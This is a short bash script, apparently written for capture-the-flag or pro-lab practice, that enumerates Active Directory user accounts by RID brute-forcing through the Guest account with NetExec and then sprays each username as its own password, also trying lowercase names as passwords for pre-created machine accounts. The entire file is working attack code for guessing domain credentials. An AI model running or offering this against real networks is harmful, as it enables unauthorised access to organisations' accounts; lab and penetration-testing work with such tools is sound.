#!/bin/bash
# ad-weak-creds.sh - Test username=password on all AD users
# Usage: ./ad-weak-creds.sh <domain> <dc-ip>

DOMAIN="${1:-retro.vl}"
DC_IP="${2:-10.129.234.44}"
VENV="/Users/gluppler/Downloads/CTFs-Testing/Pro-Labs/.venv313/bin"

echo "=== Weak Credential Check ==="

# Extract user list from nxc output
$VENV/nxc smb "$DOMAIN" -u Guest -p "" --rid-brute 1200 2>/dev/null | grep "SidTypeUser" | awk '{print $6}' | cut -d'\' -f2 > /tmp/ad_users.txt

echo "[*] Testing username=password on $(wc -l < /tmp/ad_users.txt) users..."
$VENV/nxc smb "$DOMAIN" -u /tmp/ad_users.txt -p /tmp/ad_users.txt --continue-on-success 2>/dev/null | grep "\[\+\]" 

echo ""
echo "[*] Also test pre-created machine accounts..."
for user in $(grep '\$' /tmp/ad_users.txt); do
    pass=$(echo "$user" | tr '[:upper:]' '[:lower:]' | sed 's/\$//')
    result=$($VENV/nxc smb "$DOMAIN" -u "$user" -p "$pass" 2>/dev/null | grep "STATUS_LOGON_FAILURE\|STATUS_NOLOGON\|\[\+\]")
    echo "$user / $pass: $result"
done

echo "=== Done ==="
